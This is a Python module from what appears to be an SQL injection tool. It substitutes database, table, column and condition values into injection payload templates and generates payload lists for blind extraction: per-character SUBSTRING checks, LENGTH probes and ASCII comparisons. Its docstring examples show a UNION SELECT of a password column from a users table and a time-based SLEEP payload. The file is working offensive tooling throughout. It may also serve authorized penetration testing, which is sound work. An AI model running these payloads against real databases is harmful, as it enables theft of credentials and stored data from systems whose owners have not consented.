"""Placeholder substitution for SQL injection payloads."""

import re
from typing import Optional


def substitute_placeholders(
    payload: str,
    database: Optional[str] = None,
    table: Optional[str] = None,
    column: Optional[str] = None,
    value: Optional[str] = None,
    delay: Optional[int] = None,
    condition: Optional[str] = None,
    **kwargs
) -> str:
    """
    Substitute placeholders in payload with actual values.

    Supported placeholders:
        {{DB}}, {{DATABASE}} - Database name
        {{TABLE}} - Table name
        {{COLUMN}} - Column name
        {{VALUE}} - Value to inject
        {{DELAY}} - Time delay for blind attacks
        {{CONDITION}} - Condition for blind attacks
        {{N}} - Any custom placeholder via kwargs

    Args:
        payload: Payload template with placeholders
        database: Database name
        table: Table name
        column: Column name
        value: Value to inject
        delay: Time delay in seconds
        condition: Condition string
        **kwargs: Additional custom placeholders

    Returns:
        Payload with placeholders substituted

    Example:
        >>> substitute_placeholders(
        ...     "' UNION SELECT {{COLUMN}} FROM {{TABLE}}--",
        ...     table="users",
        ...     column="password"
        ... )
        "' UNION SELECT password FROM users--"
    """
    result = payload

    # Standard placeholders
    substitutions = {
        "{{DB}}": database,
        "{{DATABASE}}": database,
        "{{TABLE}}": table,
        "{{COLUMN}}": column,
        "{{VALUE}}": value,
        "{{DELAY}}": str(delay) if delay is not None else None,
        "{{CONDITION}}": condition,
    }

    # Add custom placeholders from kwargs
    for key, val in kwargs.items():
        substitutions[f"{{{{{key.upper()}}}}}"] = str(val) if val is not None else None

    # Apply substitutions
    for placeholder, replacement in substitutions.items():
        if replacement is not None:
            result = result.replace(placeholder, replacement)

    return result


def substitute_batch(
    payloads: list[str],
    database: Optional[str] = None,
    table: Optional[str] = None,
    column: Optional[str] = None,
    **kwargs
) -> list[str]:
    """
    Substitute placeholders in multiple payloads.

    Args:
        payloads: List of payload templates
        database: Database name
        table: Table name
        column: Column name
        **kwargs: Additional custom placeholders

    Returns:
        List of payloads with substitutions
    """
    return [
        substitute_placeholders(p, database=database, table=table, column=column, **kwargs)
        for p in payloads
    ]


def generate_extraction_payloads(
    base_payload: str,
    target_query: str,
    char_position_start: int = 1,
    char_position_end: int = 50,
    charset: Optional[str] = None
) -> list[str]:
    """
    Generate payloads for character-by-character extraction (blind SQLi).

    Args:
        base_payload: Base payload template with {{CONDITION}} placeholder
        target_query: Query to extract data from
        char_position_start: Starting character position
        char_position_end: Ending character position
        charset: Character set to test (defaults to printable ASCII)

    Returns:
        List of payloads for each character position and test character

    Example:
        >>> payloads = generate_extraction_payloads(
        ...     "' AND IF({{CONDITION}},SLEEP(3),0)--",
        ...     "(SELECT password FROM users LIMIT 1)",
        ...     1, 5
        ... )
    """
    if charset is None:
        # Default charset: alphanumeric and common special chars
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}!@#$%^&*()."

    payloads = []

    for pos in range(char_position_start, char_position_end + 1):
        for char in charset:
            # Create condition for this position and character
            condition = f"SUBSTRING({target_query},{pos},1)='{char}'"
            payload = substitute_placeholders(base_payload, condition=condition)
            payloads.append(payload)

    return payloads


def generate_length_detection_payloads(
    base_payload: str,
    target_query: str,
    max_length: int = 100
) -> list[str]:
    """
    Generate payloads to detect string length (for blind SQLi).

    Args:
        base_payload: Base payload template with {{CONDITION}} placeholder
        target_query: Query to get length of
        max_length: Maximum length to test

    Returns:
        List of payloads testing each length
    """
    payloads = []

    for length in range(1, max_length + 1):
        condition = f"LENGTH({target_query})={length}"
        payload = substitute_placeholders(base_payload, condition=condition)
        payloads.append(payload)

    return payloads


def generate_binary_search_payloads(
    base_payload: str,
    target_query: str,
    position: int,
    low: int = 32,
    high: int = 126
) -> list[tuple[str, int]]:
    """
    Generate payloads for binary search character extraction.

    More efficient than linear search for blind SQLi.

    Args:
        base_payload: Base payload template with {{CONDITION}} placeholder
        target_query: Query to extract from
        position: Character position to extract
        low: Low ASCII value
        high: High ASCII value

    Returns:
        List of (payload, midpoint) tuples for binary search
    """
    payloads = []
    mid = (low + high) // 2

    # Generate comparison payload
    condition = f"ASCII(SUBSTRING({target_query},{position},1))>{mid}"
    payload = substitute_placeholders(base_payload, condition=condition)
    payloads.append((payload, mid))

    return payloads


def parse_substitution_string(sub_string: str) -> dict[str, str]:
    """
    Parse a substitution string like "DB=testdb,TABLE=users,COLUMN=password".

    Args:
        sub_string: Comma-separated key=value pairs

    Returns:
        Dictionary of substitutions
    """
    result = {}

    for item in sub_string.split(","):
        item = item.strip()
        if "=" in item:
            key, value = item.split("=", 1)
            result[key.strip().lower()] = value.strip()

    return result
